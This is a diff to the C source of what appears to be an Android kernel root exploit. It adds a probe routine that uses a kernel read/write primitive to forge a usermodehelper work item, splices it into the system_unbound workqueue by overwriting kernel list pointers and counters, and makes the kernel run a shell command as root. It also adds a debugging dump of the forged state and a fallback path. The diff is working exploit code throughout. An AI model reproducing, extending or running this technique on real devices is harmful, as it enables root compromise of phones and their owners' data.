@@ -37,6 +37,9 @@
 #define ROOT_SOCKET_PATH "/data/local/tmp/temp_su.sock"
 #define SU_SOCKET_ENV "CVE43499_SU_SOCKET"
 #define SU_SOCKET_PATH_OFF 0x200
+#define PROBE_WORK_OFF 0x900
+#define PROBE_DATA_OFF 0xb00
+#define PROBE_CMD_OFF 0xe00
 #define RECLAIM_ATTEMPT_TIMEOUT_MS 120000
 #define Q0_WRITE_ATTEMPTS 4
 #define Q0_WRITE_ATTEMPT_DELAY_MS 300
@@ -444,6 +447,184 @@ static int wake_system_unbound(void) {
   return master_result == 0 && slave_result == 0;
 }
 
+static void dump_umh_state(int fd, uint64_t alias) {
+  unsigned char blob[112];
+  uint64_t completion = alias + ROOT_DATA_OFF +
+                        offsetof(struct umh_kernel_data, completion);
+  uint32_t done = 0;
+  uint32_t wait = 0;
+  uint32_t retval = 0;
+
+  if (read_exact(fd, alias + ROOT_WORK_OFF, blob, sizeof(blob))) {
+    printf("umh state work=");
+    for (size_t i = 0; i < sizeof(blob); i += 8) {
+      printf("%02x%02x%02x%02x%02x%02x%02x%02x", blob[i], blob[i + 1],
+             blob[i + 2], blob[i + 3], blob[i + 4], blob[i + 5], blob[i + 6],
+             blob[i + 7]);
+      if (i + 8 < sizeof(blob))
+        putchar(' ');
+    }
+    putchar('\n');
+  }
+  if (!read32(fd, completion + offsetof(struct umh_completion, done), &done) ||
+      !read32(fd, alias + ROOT_WORK_OFF + offsetof(struct umh_subprocess_info,
+                                                   wait),
+              &wait) ||
+      !read32(fd, alias + ROOT_WORK_OFF + offsetof(struct umh_subprocess_info,
+                                                   retval),
+              &retval))
+    return;
+  printf("umh state done=%u wait=%#x retval=%d\n", done, wait, (int)retval);
+  fflush(stdout);
+}
+
+static int umh_probe_marker(int fd, uint64_t alias, uint64_t slide) {
+  struct umh_subprocess_info fake;
+  struct umh_kernel_data data;
+  uint64_t work = alias + PROBE_WORK_OFF;
+  uint64_t data_address = alias + PROBE_DATA_OFF;
+  uint64_t cmd_address = alias + PROBE_CMD_OFF;
+  uint64_t completion =
+      data_address + offsetof(struct umh_kernel_data, completion);
+  uint64_t wait_list = completion + offsetof(struct umh_completion, next);
+  uint64_t worklist;
+  uint64_t wq = 0;
+  uint64_t pwq = 0;
+  uint64_t pool = 0;
+  uint64_t pwq_wq = 0;
+  uint64_t list_next = 0;
+  uint64_t list_prev = 0;
+  uint64_t entry = work + WORK_ENTRY_OFF;
+  uint64_t work_data;
+  uint32_t color = 0;
+  uint32_t refcnt = 0;
+  uint32_t nr_inflight = 0;
+  uint32_t nr_active = 0;
+  uint32_t max_active = 0;
+  uint32_t nr_idle = 0;
+  uint32_t complete_done = 0;
+  uint32_t raw_retval = 0;
+  char command[224];
+  char probe_path[128];
+  int wake_ok = 0;
+  int marker_ok = 0;
+  int32_t retval;
+  struct timespec timestamp;
+  unsigned nonce;
+
+  clock_gettime(CLOCK_MONOTONIC, &timestamp);
+  nonce = ((unsigned)getpid() * 2654435761u) ^ (unsigned)timestamp.tv_sec ^
+          (unsigned)timestamp.tv_nsec;
+  snprintf(probe_path, sizeof(probe_path),
+           "/data/local/tmp/rmg-umh-%08x.probe", nonce);
+  unlink(probe_path);
+
+  if (!read64(fd, SYSTEM_UNBOUND_WQ_ALIAS + slide, &wq) ||
+      !is_direct_pointer(wq) || !read64(fd, wq + WQ_DFL_PWQ_OFF, &pwq) ||
+      !is_direct_pointer(pwq) || !read64(fd, pwq + PWQ_POOL_OFF, &pool) ||
+      !is_direct_pointer(pool) || !read64(fd, pwq + PWQ_WQ_OFF, &pwq_wq) ||
+      pwq_wq != wq) {
+    printf("umh probe: bad wq ptr\n");
+    return 0;
+  }
+  worklist = pool + POOL_WORKLIST_OFF;
+  for (int attempt = 0; attempt < 500; attempt++) {
+    if (!read64(fd, worklist, &list_next) ||
+        !read64(fd, worklist + sizeof(uint64_t), &list_prev) ||
+        !read32(fd, pool + POOL_NR_IDLE_OFF, &nr_idle) ||
+        !read32(fd, pwq + PWQ_NR_ACTIVE_OFF, &nr_active))
+      return 0;
+    if (list_next == worklist && list_prev == worklist && nr_idle && !nr_active)
+      break;
+    usleep(1000);
+  }
+  if (list_next != worklist || list_prev != worklist || !nr_idle || nr_active) {
+    printf("umh probe: pool busy list=%#llx/%#llx idle=%u active=%u\n",
+           (unsigned long long)list_next, (unsigned long long)list_prev,
+           nr_idle, nr_active);
+    return 0;
+  }
+  if (!read32(fd, pwq + PWQ_WORK_COLOR_OFF, &color) || color >= 15 ||
+      !read32(fd, pwq + PWQ_REFCNT_OFF, &refcnt) || !refcnt ||
+      !read32(fd, pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t),
+              &nr_inflight) ||
+      !read32(fd, pwq + PWQ_MAX_ACTIVE_OFF, &max_active) || !max_active) {
+    printf("umh probe: bad queue state\n");
+    return 0;
+  }
+
+  memset(&data, 0, sizeof(data));
+  snprintf(data.path, sizeof(data.path), "%s", "/system/bin/sh");
+  snprintf(data.arg, sizeof(data.arg), "%s", "-c");
+  snprintf(command, sizeof(command), "echo umh-ok > %s", probe_path);
+  data.completion.next = wait_list;
+  data.completion.prev = wait_list;
+  data.argv[0] = data_address + offsetof(struct umh_kernel_data, path);
+  data.argv[1] = data_address + offsetof(struct umh_kernel_data, arg);
+  data.argv[2] = cmd_address;
+  data.argv[3] = 0;
+  data.envp[0] = 0;
+
+  memset(&fake, 0, sizeof(fake));
+  work_data = pwq | ((uint64_t)color << 4) | 5;
+  memcpy(fake.work, &work_data, sizeof(work_data));
+  memcpy(fake.work + WORK_ENTRY_OFF, &worklist, sizeof(worklist));
+  memcpy(fake.work + WORK_ENTRY_OFF + sizeof(uint64_t), &worklist,
+         sizeof(worklist));
+  work_data = CALL_USERMODEHELPER_EXEC_WORK_IMAGE + slide;
+  memcpy(fake.work + WORK_FUNC_OFF, &work_data, sizeof(work_data));
+  fake.complete = completion;
+  fake.path = data.argv[0];
+  fake.argv = data_address + offsetof(struct umh_kernel_data, argv);
+  fake.envp = data_address + offsetof(struct umh_kernel_data, envp);
+
+  if (!write_exact(fd, data_address, &data, sizeof(data)) ||
+      !write_exact(fd, cmd_address, command, strlen(command) + 1) ||
+      !write_exact(fd, work, &fake, sizeof(fake))) {
+    printf("umh probe: payload write failed errno=%d\n", errno);
+    return 0;
+  }
+  __atomic_thread_fence(__ATOMIC_SEQ_CST);
+  if (!write32(fd, pwq + PWQ_NR_IN_FLIGHT_OFF + color * sizeof(uint32_t),
+               nr_inflight + 1) ||
+      !write32(fd, pwq + PWQ_NR_ACTIVE_OFF, nr_active + 1) ||
+      !write32(fd, pwq + PWQ_REFCNT_OFF, refcnt + 1) ||
+      !write64(fd, worklist + sizeof(uint64_t), entry) ||
+      !write64(fd, worklist, entry)) {
+    printf("umh probe: queue write failed errno=%d\n", errno);
+    return 0;
+  }
+
+  for (int attempt = 0; attempt < 8 && !complete_done; attempt++) {
+    wake_ok |= wake_system_unbound();
+    for (int poll = 0; poll < 250; poll++) {
+      if (!read32(fd,
+                  data_address + offsetof(struct umh_kernel_data, completion) +
+                      offsetof(struct umh_completion, done),
+                  &complete_done))
+        return 0;
+      if (complete_done)
+        break;
+      usleep(1000);
+    }
+  }
+  if (!read32(fd, work + offsetof(struct umh_subprocess_info, retval),
+              &raw_retval))
+    return 0;
+  retval = (int32_t)raw_retval;
+  for (int attempt = 0; attempt < 200; attempt++) {
+    if (access(probe_path, F_OK) == 0) {
+      marker_ok = 1;
+      break;
+    }
+    usleep(10000);
+  }
+  printf("umh probe present=%d done=%u retval=%d path=%s wake=%d\n",
+         marker_ok, complete_done, retval, probe_path, wake_ok);
+  fflush(stdout);
+  return marker_ok;
+}
+
 static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
   struct umh_subprocess_info fake;
   struct umh_kernel_data data;
@@ -613,7 +794,11 @@ static int install_umh_root(int fd, uint64_t alias, uint64_t slide) {
          wake_ok, complete_done, retval, root_socket_ready(),
          root_socket_errno, daemon_present(), selinux_disabled() ? 0 : 1);
   fflush(stdout);
-  return complete_done && !retval && root_socket_ready();
+  if (complete_done && !retval && root_socket_ready())
+    return 1;
+  dump_umh_state(fd, alias);
+  umh_probe_marker(fd, alias, slide);
+  return 0;
 }
 
 static _Noreturn void hold_dirty_failure(const char *where) {
